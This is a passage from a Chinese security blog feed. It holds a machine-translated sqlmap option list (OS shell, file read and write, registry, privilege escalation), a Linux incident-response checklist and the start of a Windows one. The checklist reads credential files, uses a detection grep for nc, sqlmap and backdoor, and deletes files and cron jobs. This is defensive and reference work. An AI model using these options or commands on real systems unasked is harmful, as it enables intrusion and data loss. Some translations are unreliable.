数据库管理系统数据库标识符(s)不列举<br>    -U<span class="hljs-built_in"> USER </span>            DBMS用户列举<br>    --exclude-sysdbs    列举表时排除DBMS系统数据库<br>    <span class="hljs-attribute">--pivot-column</span>=P..  主列名称<br>    <span class="hljs-attribute">--where</span>=DUMPWHERE   使用条件而表倾销<br>    <span class="hljs-attribute">--start</span>=LIMITSTART  第一个转储表条目检索<br>    <span class="hljs-attribute">--stop</span>=LIMITSTOP    去年转储表条目检索<br>    <span class="hljs-attribute">--first</span>=FIRSTCHAR   第一个查询输出单词字符检索<br>    <span class="hljs-attribute">--last</span>=LASTCHAR     最后输出单词字符检索查询<br>    <span class="hljs-attribute">--sql-query</span>=SQLQ..  要执行的SQL语句<br>    --sql-shell         提示一个交互式SQL壳<br>    <span class="hljs-attribute">--sql-file</span>=SQLFILE  从给定的文件执行的SQL语句(s)<br><br>  蛮力破解:<br>    这些选项可用于运行暴力检查<br><br>    --common-tables     检查存在的常见的表<br>    --common-columns    检查是否存在共同的列<br>    --common-files      检查公共文件的存在<br><br>  用户定义函数注入:<br>    这些选项可用于创建自定义用户定义函数<br><br>    --udf-inject        注入自定义用户定义函数<br>    <span class="hljs-attribute">--shared-lib</span>=SHLIB  共享库的本地路径<br><br>  文件系统访问:<br>    这些选项可用于访问后端数据库管理系统底层文件系统<br><br>    <span class="hljs-attribute">--file-read</span>=FILE..  读取一个文件从文件系统后端数据库管理系统<br>    <span class="hljs-attribute">--file-write</span>=FIL..  写一个本地文件的后端数据库管理系统的文件系统<br>    <span class="hljs-attribute">--file-dest</span>=FILE..  后端DBMS绝对filepath写<br><br>  操作系统访问:<br>    这些选项可用于访问后端数据库管理系统底层操作系统<br><br>    <span class="hljs-attribute">--os-cmd</span>=OSCMD      执行一个操作系统命令<br>    --os-shell          提示一个交互式操作系统shell<br>    --os-pwn            OOB shell提示,Meterpreter或VNC<br>    --os-smbrelay       一个点击提示OOB壳,Meterpreter或VNC<br>    --os-bof            存储过程缓冲区溢出exploitation<br>    --priv-esc          数据库处理用户特权升级<br>    <span class="hljs-attribute">--msf-path</span>=MSFPATH  地方道路Metasploit框架安装<br>    <span class="hljs-attribute">--tmp-path</span>=TMPPATH  远程临时文件目录的绝对路径<br><br>  Windows注册表访问:<br>    这些选项可用于访问后端数据库管理系统Windows注册表<br><br>    --reg-read          读一个Windows注册表键值<br>    --reg-<span class="hljs-built_in">add</span>           写一个Windows注册表键值数据<br>    --reg-del           删除一个Windows注册表键值<br>    <span class="hljs-attribute">--reg-key</span>=REGKEY    Windows注册表键<br>    <span class="hljs-attribute">--reg-value</span>=REGVAL  Windows注册表键 value<br>    <span class="hljs-attribute">--reg-data</span>=REGDATA  Windows注册表键 value data<br>    <span class="hljs-attribute">--reg-type</span>=REGTYPE  Windows注册表键 value<span class="hljs-built_in"> type</span><br><span class="hljs-built_in"></span><br>  全体的:<br>    这些选项可用于设置一些常规工作参数<br><br>    -s SESSIONFILE      从一个存储加载会话(.sqlite)文件<br>    -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中<br>    <span class="hljs-attribute">--answers</span>=ANSWERS   预定义的答案(例如 <span class="hljs-string">&quot;quit=N,follow=N&quot;</span>)<br>    <span class="hljs-attribute">--base64</span>=BASE64P..  包含Base64编码数据的参数(年代)<br>    --base64-safe       使用URL和文件名安全Base64字母表(RFC 4648)<br>    --batch             从来没有要求用户输入,使用默认的行为<br>    <span class="hljs-attribute">--binary-fields</span>=..  结果字段有二进制值(例如 <span class="hljs-string">&quot;digest&quot;</span>)<br>    --check-internet    检查网络连接之前评估的目标<br>    --cleanup           清理的DBMS sqlmap特定UDF和表<br>    <span class="hljs-attribute">--crawl</span>=CRAWLDEPTH  爬行网站从目标URL<br>    <span class="hljs-attribute">--crawl-exclude</span>=..  Regexp排除页面爬行(例如 <span class="hljs-string">&quot;logout&quot;</span>)<br>    <span class="hljs-attribute">--csv-del</span>=CSVDEL    (CSV输出中使用的分隔字符 (默认 <span class="hljs-string">&quot;,&quot;</span>)<br>    <span class="hljs-attribute">--charset</span>=CHARSET   盲SQL注入字符集(例如 <span class="hljs-string">&quot;0123456789abcdef&quot;</span>)<br>    <span class="hljs-attribute">--dump-file</span>=DUMP..  将数据存储到一个自定义文件<br>    <span class="hljs-attribute">--dump-format</span>=DU..  了数据的格式(CSV(默认)、HTML或SQLITE)<br>    <span class="hljs-attribute">--encoding</span>=ENCOD..  字符编码用于数据检索(例如GBK)<br>    --eta               预计到达时间为每个输出显示<br>    --flush-session     冲洗会话文件当前的目标<br>    --forms             解析和测试目标URL形式<br>    --fresh-queries     忽略查询结果存储在会话文件中<br>    <span class="hljs-attribute">--gpage</span>=GOOGLEPAGE  使用指定页码的Google dork结果<br>    <span class="hljs-attribute">--har</span>=HARFILE       记录所有HTTP流量HAR文件<br>    --hex               在数据检索使用十六进制转换<br>    <span class="hljs-attribute">--output-dir</span>=OUT..  自定义输出目录路径<br>    --parse-errors      从响应解析和显示DBMS的错误消息<br>    <span class="hljs-attribute">--preprocess</span>=PRE..  使用给定的脚本(s)预处理(请求)<br>    <span class="hljs-attribute">--postprocess</span>=PO..  使用给定的脚本(s)后处理(响应)<br>    --repair            Redump条目有未知字符标记(?)<br>    <span class="hljs-attribute">--save</span>=SAVECONFIG   保存选项来配置INI文件<br>    <span class="hljs-attribute">--scope</span>=SCOPE       Regexp过滤目标<br>    --skip-heuristics   跳过启发式检测漏洞<br>    --skip-waf          跳过WAF/IPS保护的启发式检测<br>    <span class="hljs-attribute">--table-prefix</span>=T..  前缀用于临时表(默认值: <span class="hljs-string">&quot;sqlmap&quot;</span>)<br>    <span class="hljs-attribute">--test-filter</span>=TE..  按有效载荷和/或标题选择测试(例如 ROW)<br>    <span class="hljs-attribute">--test-skip</span>=TEST..  按有效载荷和/或标题跳过测试(例如 BENCHMARK)<br>    <span class="hljs-attribute">--web-root</span>=WEBROOT  Web服务器的文档根目录(例如 <span class="hljs-string">&quot;/var/www&quot;</span>)<br><br>  混杂的:<br>    这些选项不属于任何其他类别<br><br>    -z MNEMONICS        使用短助记符(例如 <span class="hljs-string">&quot;flu,bat,ban,tec=EU&quot;</span>)<br>    <span class="hljs-attribute">--alert</span>=ALERT       运行主机操作系统命令(s) SQL注入时发现<br>    --beep              出现问题和/或发现漏洞时发出蜂鸣声<br>    --dependencies      检查丢失(可选)sqlmap依赖性<br>    --disable-coloring  禁用控制台输出颜色<br>    --list-tampers      显示列表可用夯的脚本<br>    --no-logging        禁用日志记录到一个文件<br>    --offline           在离线模式下工作(只使用会话数据)<br>    --purge             从sqlmap数据目录中安全地删除所有内容<br>    <span class="hljs-attribute">--results-file</span>=R..  在多个目标模式下结果CSV文件的位置<br>    --shell             提示一个交互式sqlmap壳<br>    <span class="hljs-attribute">--tmp-dir</span>=TMPDIR    本地目录用于存储临时文件<br>    --unstable          调整选项不稳定的连接<br>    --update            更新sqlmap<br>    --wizard            为新手用户简单的向导界面<br></code></pre></td></tr></table></figure><p>文章参考：<a href="https://www.cnblogs.com/R3col/p/12452543.html">Sqlmap使用方法总结</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux应急</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="异常进程、端口排查"><a href="#异常进程、端口排查" class="headerlink" title="异常进程、端口排查"></a>异常进程、端口排查</h1><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tcl">查找占用cpu最多的进程，相关命令：运行top命令后，键入大写字母P按cpu排序<br>查找占用内存最多的进程，相关命令：运行top命令后，键入大写字母M按内存排序<br>查看显卡占用情况：nvidia-smi<br>查看静态进程：ps -ef<br>查看进程的可执行程序：ls -l /<span class="hljs-keyword">proc</span>/PID/exe<br>查看进程打开的文件：lsof -p<span class="hljs-title"> PID</span><br>查看进程的启动时间点：ps -p<span class="hljs-title"> PID</span> -o<span class="hljs-title"> lstart</span><br>查看进程启动时间以及关联的子进程：systemctl<span class="hljs-title"> status</span> PID<br>查看端口对应的进程：lsof -i:PORT<br>查看进程sshd打开的文件：lsof -c<span class="hljs-title"> sshd</span><br>跟踪异常进程运行情况：strace -tt -T -e<span class="hljs-title"> trace=all</span> -p<span class="hljs-title"> PID</span><br>检查进程挂载：cat /<span class="hljs-keyword">proc</span>/mounts 或<span class="hljs-title"> cat</span> /<span class="hljs-keyword">proc</span>/$$/mountinfo<br>查看进程的线程：top -Hp &lt;进程pid&gt;<br></code></pre></td></tr></table></figure><p>更多可参考：<a href="https://blog.csdn.net/yingchao_yuan/article/details/109199868">https://blog.csdn.net/yingchao_yuan/article/details/109199868</a></p><h1 id="命令排查"><a href="#命令排查" class="headerlink" title="命令排查"></a>命令排查</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看当前用户历史命令：<span class="hljs-built_in">history</span><br>查看root用户历史命令：<span class="hljs-built_in">cat</span> /root/.bash_history<br>查看某用户历史命令：<span class="hljs-built_in">cat</span> /home/&lt;用户&gt;/.bash_history<br>使<span class="hljs-built_in">history</span>命令显示时间戳：<span class="hljs-built_in">export</span> HISTTIMEFORMAT=<span class="hljs-string">&#x27;%F %T &#x27;</span><br></code></pre></td></tr></table></figure><h1 id="网络排查"><a href="#网络排查" class="headerlink" title="网络排查"></a>网络排查</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">查看外连地址及相关进程：netstat -antlp<br></code></pre></td></tr></table></figure><h1 id="定时任务排查"><a href="#定时任务排查" class="headerlink" title="定时任务排查"></a>定时任务排查</h1><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">crontab -<span class="hljs-keyword">l</span> （/<span class="hljs-keyword">var</span>/spool/cron/ 目录下的都要检查）<br>查看用户定时任务：crontab -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">u</span> 用户名<br>查看隐藏的定时任务：<span class="hljs-keyword">cat</span> -A /<span class="hljs-keyword">var</span>/spool/cron/root<br>查看定时任务日志：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron <span class="hljs-keyword">log</span><br>查看定时任务执行记录：tail -f /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron<br></code></pre></td></tr></table></figure><h1 id="异常文件排查"><a href="#异常文件排查" class="headerlink" title="异常文件排查"></a>异常文件排查</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">注意使用<span class="hljs-built_in">ls</span> -al以及判断库文件劫持、别名<br>注意文件：执行文件、json文件<br>目录着重看绿色的可执行文件：/etc、/tmp、/、/usr、/root、/boot、/bin、/usr/bin、/sbin<br>保存历史命令：<span class="hljs-built_in">cat</span> .bash_history &gt;&gt; history.txt<br>查看etc目录最近7天内被修改的文件：find /etc -mtime 7 -<span class="hljs-built_in">print</span><br>查看/www目录指定时间范围内新增的文件：find /www -<span class="hljs-built_in">type</span> f -newermt <span class="hljs-string">&#x27;2023-06-25 00:00&#x27;</span> -a -not -newermt <span class="hljs-string">&#x27;2023-06-26 23:59&#x27;</span><br>查看/etc目录修改时间小于7天的配置文件：find /etc -iname <span class="hljs-string">&quot;*conf*&quot;</span> -mtime -7 -<span class="hljs-built_in">print</span><br>查找cron文件中是否存在恶意脚本：<br>/var/spool/cron/*、/etc/crontab、/etc/cron.d/*、/etc/cron.daily/*、/etc/cron.hourly/* 、/etc/cron.monthly/*、/etc/cron.weekly/、/etc/anacrontab、/var/spool/anacron/*<br>查看私钥文件：<span class="hljs-built_in">cat</span> /root/.ssh/authorized_keys<br>查看文件创建修改时间：<span class="hljs-built_in">stat</span> 文件<br>查找文件：find / -name <span class="hljs-string">&quot;localhost_access_log*&quot;</span><br>查看文件隐藏属性：lsattr 文件<br>修改文件隐藏属性：chattr -/+ 属性 文件<br>输出文件md5：<span class="hljs-built_in">md5sum</span> 文件<br>检查hosts文件：<span class="hljs-built_in">cat</span> /etc/hosts<br>os文件分析：strings os文件<br>查找包含关键字符的普通文件（排除目录、设备文件等特殊文件类型）：find / -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -l <span class="hljs-string">&quot;10.16.5.134&quot;</span> &#123;&#125; + 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1 id="账号安全排查"><a href="#账号安全排查" class="headerlink" title="账号安全排查"></a>账号安全排查</h1><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stata">注意：ubuntu高版本将secure日志目录改成了auth<br>查找特权用户：awk -F <span class="hljs-string">&quot;:&quot;</span> &#x27;<span class="hljs-variable">$3</span>==0&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; /etc/passwd<br>查找可以远程登录的账号信息：awk &#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$6</span>/&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; /etc/shadow<br>查找sudo权限账户：<span class="hljs-keyword">cat</span> /etc/sudoers | grep -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | grep <span class="hljs-string">&quot;ALL=(ALL)&quot;</span> a<br>查找空口令账户：awk -F: &#x27;(<span class="hljs-variable">$2</span>==<span class="hljs-string">&quot;!!&quot;</span>) &#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; /etc/shadow<br>查看登录成功日志：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep <span class="hljs-string">&quot;Accepted password&quot;</span><br>查看登录失败日志：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep <span class="hljs-string">&quot;Failed password&quot;</span><br>查看本机登录情况：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep -<span class="hljs-keyword">E</span> <span class="hljs-string">&quot;sshd:session.*session opened&quot;</span><br>查看新增用户：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep <span class="hljs-string">&quot;new user&quot;</span><br>查看所有用户最后一次登录的时间：lastlog<br>记录当前正在登录系统的用户信息,uptime记录系统启动时间(/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp)：w<br>查看所有用户的登录注销信息及系统的启动、重启及关机事件(/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp)：last<br>记录失败的登录尝试信息(/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp):lastb<br>所有用户登录日志：last | grep pts | grep -vw :0<br>查看登录成功的日期、用户名及ip：grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1</span>,<span class="hljs-variable">$2</span>,<span class="hljs-variable">$3</span>,<span class="hljs-variable">$9</span>,<span class="hljs-variable">$11&#125;</span>&#x27;<br>查看试图爆破主机的ip：grep refused /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c |<span class="hljs-keyword">sort</span> -nr | <span class="hljs-keyword">more</span> grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep -<span class="hljs-keyword">E</span> -o <span class="hljs-string">&quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot;</span> | uniq -c<br>查看有哪些ip在爆破主机的root账号：grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span><br>查看爆破用户名字典：grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><h1 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h1><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stata">日志默认存放位置：/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<br>安全日志：/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure<br>定时任务日志：/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron<br>软件安装卸载日志： /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/yum.<span class="hljs-keyword">log</span><br>邮件相关：/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog<br>日志配置情况：<span class="hljs-keyword">more</span> /etc/rsyslog.<span class="hljs-keyword">conf</span><br>传输文件：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message* | grep <span class="hljs-string">&quot;ZMODEM:.*BPS&quot;</span><br>定时任务日志：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron*<br>定时执行脚本：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron* | grep -<span class="hljs-keyword">E</span> <span class="hljs-string">&quot;\.py$|\.sh$|\.pl$&quot;</span><br>下载软件情况：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/yum* | grep Installed<br>卸载软件情况：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/yum* | grep Erased<br>可疑工具：<span class="hljs-keyword">more</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/yum* | awk -F: &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$NF&#125;</span>&#x27; | awk -F &#x27;[-]&#x27; &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; | <span class="hljs-keyword">sort</span> | uniq | grep -<span class="hljs-keyword">E</span> <span class="hljs-string">&quot;(^nc|sqlmap|nmap|beef|nikto|john|ettercap|backdoor|msfcosole)&quot;</span><br>Nginx日志文件：access.<span class="hljs-keyword">log</span><br>joumalctl日志<br>journal默认配置文件路径：/etc/systemd/journald.<span class="hljs-keyword">conf</span><br>日志从旧到新显示：journalctl<br>日志从新到旧显示：journalctl -r<br>查看进程：journalctl _PID=<span class="hljs-variable">$pid</span><br>journalctl的语法使用跟默认日志的使用一致，如journalctl | grep <span class="hljs-string">&quot;Accepted password&quot;</span><br></code></pre></td></tr></table></figure><h1 id="命令排查-1"><a href="#命令排查-1" class="headerlink" title="命令排查"></a>命令排查</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">查看历史命令执行记录：<span class="hljs-keyword">history</span>（ 普通账户的历史命令，<span class="hljs-string">/home</span>各账号目录下的<span class="hljs-string">.bash_history</span>）<br>按时间排序，确认最近是否有命令被替换，可以结合rpm -Va命令：<span class="hljs-keyword">ls</span> -all <span class="hljs-string">/usr/bin</span> <span class="hljs-string">/usr/sbin</span> <span class="hljs-string">/bin</span> <span class="hljs-string">/usr/local/bin</span> | rpm -Va&gt;rpm.log<br>查看被别名的命令：<span class="hljs-keyword">alias</span><br>取消被别名的命令：<span class="hljs-keyword">unalias</span> 命令<br></code></pre></td></tr></table></figure><h1 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">查看是否有异常开机启动项：cat <span class="hljs-string">/etc/rc.local</span> | chkconfig <span class="hljs-params">--list</span><br>查看启动配置文件：vi <span class="hljs-string">/lib/systemd/system/rc-local.service</span><br>看启动文件：<span class="hljs-string">/etc/rc.local</span>、<span class="hljs-string">/etc/rc</span>[0-6]<span class="hljs-string">.d</span><br>看启动文件目录：<span class="hljs-string">/etc/rc.d</span>、 <span class="hljs-string">/etc/rc.d/init.d</span><br>看异常脚本： <span class="hljs-string">/etc/profile.d/</span> 、<span class="hljs-string">/etc/hourly</span>、<span class="hljs-string">/etc/daily</span>、<span class="hljs-string">/etc/weekly</span>、<span class="hljs-string">/etc/monthly</span><br></code></pre></td></tr></table></figure><h1 id="库文件劫持排查"><a href="#库文件劫持排查" class="headerlink" title="库文件劫持排查"></a>库文件劫持排查</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">目前主流的劫持技术主要有三种：<br><span class="hljs-number">1.</span> 更改LD_PRELOAD环境变量，加载恶意库文件<br><span class="hljs-number">2.</span> /etc/<span class="hljs-keyword">ld</span>.so.preload加载恶意的库文件(主流的劫持技术)<br><span class="hljs-number">3.</span> 更改默认的库文件/etc/<span class="hljs-keyword">ld</span>.so.preload为其他库文件<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">其中第二条是目前遇到的最多的，其主要是通过更改/etc/ld.so.preload来预加载其他恶意的库文件来实现对系统命令，如netstat、<span class="hljs-built_in">cat</span>、top等进行劫持，从而到达隐藏进程、连接、性能等目的，这种也是rootkit典型的技术。<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">检查方法：<br>查看环境变量：<span class="hljs-keyword">echo</span> $LD_PRELOAD<br>查看命令加载的库文件：ldd /bin/<span class="hljs-keyword">ls</span><br>跟踪命令加载库的情况：strace -<span class="hljs-keyword">f</span> -<span class="hljs-keyword">e</span> trace=<span class="hljs-keyword">file</span> /bin/<span class="hljs-keyword">cat</span><br>查看ld.<span class="hljs-keyword">so</span>.preload加载库文件：<span class="hljs-keyword">cat</span> /etc/ld.<span class="hljs-keyword">so</span>.preload<br></code></pre></td></tr></table></figure><h1 id="处置"><a href="#处置" class="headerlink" title="处置"></a>处置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">清理定时任务：<br>使用chattr -i /var/spool/cron/取消文件不可修改属性，再<span class="hljs-built_in">rm</span>命令删除定时文件，可以结合crontab命令使用（清除定时任务时和客户确认是否存在正常任务，不要误删了）<br>杀掉进程:killall /kill -9 PID (可用于进程ID一直在变的场景）<br>删除所有任务：crontab -r<br>删除单个任务：crontab -e（编辑）<br>删除恶意文件：<span class="hljs-built_in">rm</span> -rf 文件<br></code></pre></td></tr></table></figure><h1 id="工具查杀病毒和rootkit"><a href="#工具查杀病毒和rootkit" class="headerlink" title="工具查杀病毒和rootkit"></a>工具查杀病毒和rootkit</h1><p>chkrootkit (下载地址-<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a>)</p><p>rkhunter (下载地址-<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a>)</p><p>clamav(下载地址-<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a>)</p><p>webshell：河马、长亭、D盾</p><p>busybox（下载地址-<a href="https://busybox.net/">https://busybox.net/</a>）</p><p>隐藏进程检测工具：unhide（<a href="https://www.unhide-forensics.info/">https://www.unhide-forensics.info/</a>）</p><ol><li><p>需先安装epel源：<code>yum -y install epel-release</code></p></li><li><p>安装：<code>yum -y install unhide</code></p></li><li><p>使用： <code>unhide proc</code></p></li></ol><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>库劫持参考文章：<a href="https://blog.csdn.net/weixin_39581716/article/details/110810798">https://blog.csdn.net/weixin_39581716/article/details/110810798</a></p><p>挖矿应急参考文章：<a href="https://mp.weixin.qq.com/s/NkleRQknAbvwvkYtNCo-Ww">https://mp.weixin.qq.com/s/NkleRQknAbvwvkYtNCo-Ww</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows应急</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">windows事件查看器：Win+<span class="hljs-built_in">R</span> 输入eventvwr.msc<br>查看定时任务：Win+<span class="hljs-built_in">R</span> 输入taskschd.msc<br>查看注册表：Win+<span class="hljs-built_in">R</span> 输入regedit<br>查看账户安全：Win+<span class="hljs-built_in">R</span> 输入lusrmgr.msc<br>查看本地组策略：Win+<span class="hljs-built_in">R</span> 输入gpedit.msc<br></code></pre></td></tr></table></figure><h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><h3 id="进程排查核心命令"><a href="#进程排查核心命令" class="headerlink" title="进程排查核心命令"></a>进程排查核心命令</h3><h4 id="1-基础进程信息获取"><a href="#1-基础进程信息获取" class="headerlink" title="1. 基础进程信息获取"></a>1. 基础进程信息获取</h4><ul><li><p><strong>查看所有进程</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist<br></code></pre></td></tr></table></figure><p>显示所有进程的映像名称、PID、内存使用等信息。</p></li><li><p><strong>查看进程关联服务</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svc<br></code></pre></td></tr></table></figure><p>显示每个进程对应的服务名称，帮助识别伪装成系统服务的恶意进程。</p></li><li><p><strong>列出所有进程的 PID 和父进程 PID​​</strong></p></li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic process get name,processid,parentprocessid<br></code></pre></td></tr></table></figure><p>其中，<code>ParentProcessId</code> 列即为目标进程的父进程 